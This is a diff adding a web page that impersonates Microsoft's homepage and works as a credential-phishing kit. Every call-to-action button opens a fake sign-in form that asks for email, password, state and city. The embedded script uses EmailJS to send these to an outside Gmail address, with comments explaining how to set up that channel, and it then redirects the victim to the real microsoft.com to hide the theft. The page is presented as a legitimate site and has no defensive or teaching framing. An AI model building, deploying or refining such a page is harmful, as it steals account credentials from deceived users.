@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>MICROSOFT – Empowering Every Person on the Planet</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet"/>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <link rel="stylesheet" href="style.css">
+
+</head>
+<body>
+
+  <!-- NAVBAR -->
+  <nav>
+    <img src="image/logo1.png" alt="Microsoft" class="nav-logo">
+    <!-- <a class="nav-logo" href="#">SKOPPE</a> -->
+    <ul class="nav-links">
+      <li><a href="#">Products</a></li>
+      <li><a href="#">Solutions</a></li>
+      <li><a href="#">Resources</a></li>
+      <li><a href="#">Support</a></li>
+      <li><a href="#">About</a></li>
+    </ul>
+    <div class="nav-right">
+      <button class="nav-icon-btn" title="Search">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+      </button>
+      <button class="nav-signin" onclick="openForm()">Sign in</button>
+    </div>
+  </nav>
+
+  <!-- HERO -->
+  <section class="hero">
+    <div class="hero-bg">
+      <div class="hero-orb o1"></div>
+      <div class="hero-orb o2"></div>
+    </div>
+    <div class="hero-content">
+      <p class="hero-eyebrow">MICROSFT 2026</p>
+      <h1 class="hero-title">Technology built to empower every person and every organization</h1>
+      <p class="hero-sub">Your privacy is important to us. The new privacy statement explains the personal data Microsoft processes.</p>
+      <button class="hero-cta" onclick="openForm()">Click Here to Continue</button>
+    </div>
+  </section>
+
+  <!-- PRODUCTS -->
+  <div class="section-header">
+    <h2 class="section-title">Our Products</h2>
+    <a class="see-all" href="#">See all products →</a>
+  </div>
+
+  <div class="product-grid">
+    <div class="product-card">
+      <div class="p-icon" style="background:#ddeeff;">💼</div>
+      <div class="p-name">MICROSOFT 365</div>
+      <div class="p-desc">Your complete productivity suite — docs, sheets, meetings, and more for teams of every size.</div>
+      <a class="p-link" href="#">Learn more →</a>
+    </div>
+    <div class="product-card">
+      <div class="p-icon" style="background:#e8f5e9;">☁️</div>
+      <div class="p-name">MICROSOFT Cloud</div>
+      <div class="p-desc">Enterprise-grade cloud infrastructure designed for scale, speed, and reliability.</div>
+      <a class="p-link" href="#">Learn more →</a>
+    </div>
+    <div class="product-card">
+      <div class="p-icon" style="background:#fff3e0;">🤖</div>
+      <div class="p-name">MICROSOFT AI</div>
+      <div class="p-desc">Intelligent automation and insights powered by next-generation artificial intelligence.</div>
+      <a class="p-link" href="#">Learn more →</a>
+    </div>
+    <div class="product-card">
+      <div class="p-icon" style="background:#fce4ec;">🔒</div>
+      <div class="p-name">MICROSOFT Security</div>
+      <div class="p-desc">Advanced protection for your identity, data, and devices — across every environment.</div>
+      <a class="p-link" href="#">Learn more →</a>
+    </div>
+  </div>
+
+  <!-- PROMO BANNER -->
+  <div class="promo">
+    <div class="promo-text">
+      <h3>Try MICROSOFT AI free for 30 days</h3>
+      <p>Automate workflows, generate insights, and boost productivity across your entire organization.</p>
+    </div>
+    <button class="promo-btn" onclick="openForm()">Get started</button>
+  </div>
+
+  <!-- NEWS -->
+  <div class="section-header">
+    <h2 class="section-title">Latest from MICROSOFT</h2>
+    <a class="see-all" href="#">See all news →</a>
+  </div>
+
+  <div class="news-grid">
+    <div class="news-card">
+      <div class="news-thumb" style="background:linear-gradient(135deg,#0067b8,#0096c7);">🚀</div>
+      <div class="news-body">
+        <div class="news-tag">Innovation</div>
+        <div class="news-title">MICROSOFT unveils next-generation cloud platform for enterprises worldwide</div>
+        <div class="news-excerpt">Our new platform delivers unmatched speed, reliability, and AI-driven automation to businesses everywhere.</div>
+      </div>
+    </div>
+    <div class="news-card">
+      <div class="news-thumb" style="background:linear-gradient(135deg,#107c10,#0096c7);">🌍</div>
+      <div class="news-body">
+        <div class="news-tag">Community</div>
+        <div class="news-title">Empowering 1 million small businesses with MICROSOFT 365</div>
+        <div class="news-excerpt">See how MICROSOFT is helping entrepreneurs across Africa and beyond transform their daily operations.</div>
+      </div>
+    </div>
+    <div class="news-card">
+      <div class="news-thumb" style="background:linear-gradient(135deg,#5c2d91,#0067b8);">🤝</div>
+      <div class="news-body">
+        <div class="news-tag">Partnership</div>
+        <div class="news-title">MICROSOFT partners with global tech leaders to expand AI research</div>
+        <div class="news-excerpt">New collaborations will accelerate responsible AI development and bring advanced tools to more regions.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <footer>
+    <div class="footer-links">
+      <a href="#">Contact MICROSOFT</a>
+      <a href="#">Privacy</a>
+      <a href="#">Terms of use</a>
+      <a href="#">Trademarks</a>
+      <a href="#">About our ads</a>
+      <a href="#">Security</a>
+      <a href="#">Sitemap</a>
+    </div>
+    <div class="footer-bottom">
+      <span class="footer-brand">MICROSOFT</span>
+      <span class="footer-copy">© 2026 MICROSOFT Corporation. All rights reserved.</span>
+    </div>
+  </footer>
+
+  <!-- FORM MODAL -->
+  <div class="overlay" id="overlay" onclick="handleOverlayClick(event)">
+    <div class="modal">
+      <button class="modal-close" onclick="closeForm()">✕</button>
+
+      <div id="modalBody">
+        <div class="modal-brand">MICROSOFT</div>
+        <p class="modal-sub">Sign in to your account to get started.</p>
+
+        <form onsubmit="submitForm(event)">
+          <div class="f-field">
+            <label>Email address</label>
+            <input type="email" id="uEmail" placeholder="name@example.com" required/>
+          </div>
+          <div class="f-field">
+            <label>Password</label>
+            <input type="password" id="uPassword" placeholder="Enter your password" required/>
+          </div>
+          <div class="f-row">
+            <div class="f-field">
+              <label>State</label>
+              <input type="text" id="uState" placeholder="e.g. Minnesota" required/>
+            </div>
+            <div class="f-field">
+              <label>City</label>
+              <input type="text" id="uCity" placeholder="e.g. St. Paul" required/>
+            </div>
+          </div>
+          <button class="f-submit" type="submit" id="submitBtn">Submit</button>
+          <div class="status" id="statusBar"></div>
+        </form>
+      </div>
+
+      <div class="success-block" id="successBlock">
+        <div class="check">✔</div>
+        <h3>You're all set!</h3>
+        <p>Your information has been received.<br/>Welcome to MICROSOFT.</p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ════════════════════════════════════════
+    //  EmailJS SETUP (free at emailjs.com)
+    //  1. Create account → Add Gmail service
+    //  2. Create template with variables:
+    //     {{user_email}}, {{user_password}},
+    //     {{user_state}}, {{user_city}}
+    //  3. Copy your Public Key, Service ID,
+    //     and Template ID below
+    // ════════════════════════════════════════
+    const EMAILJS_PUBLIC_KEY  = "VlJE09TZyZ8tO70pX";
+    const EMAILJS_SERVICE_ID  = "service_o0twfab";
+    const EMAILJS_TEMPLATE_ID = "template_ee2tycn";
+
+    emailjs.init(EMAILJS_PUBLIC_KEY);
+
+    function openForm() {
+      document.getElementById('overlay').style.display = 'flex';
+      document.body.style.overflow = 'hidden';
+    }
+
+    function closeForm() {
+      document.getElementById('overlay').style.display = 'none';
+      document.body.style.overflow = '';
+      document.getElementById('successBlock').style.display = 'none';
+      document.getElementById('modalBody').style.display = 'block';
+      document.getElementById('statusBar').textContent = '';
+      document.getElementById('statusBar').className = 'status';
+      document.getElementById('submitBtn').disabled = false;
+      document.getElementById('submitBtn').textContent = 'Continue';
+    }
+
+    function handleOverlayClick(e) {
+      if (e.target === document.getElementById('overlay')) closeForm();
+    }
+
+    async function submitForm(e) {
+      e.preventDefault();
+      const btn    = document.getElementById('submitBtn');
+      const status = document.getElementById('statusBar');
+
+      btn.disabled = true;
+      btn.textContent = 'Sending…';
+      status.textContent = '';
+      status.className = 'status';
+
+      try {
+        await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+          user_email:    document.getElementById('uEmail').value,
+          user_password: document.getElementById('uPassword').value,
+          user_state:    document.getElementById('uState').value,
+          user_city:     document.getElementById('uCity').value,
+          to_email:      "iamskoppe@gmail.com"
+        });
+        window.location.href = 'https://www.microsoft.com/en-us';
+      } catch (err) {
+        status.textContent = 'Something went wrong. Please try again.';
+        status.className = 'status err';
+        btn.disabled = false;
+        btn.textContent = 'Continue';
+      }
+    }
+  </script>
+</body>
+</html>
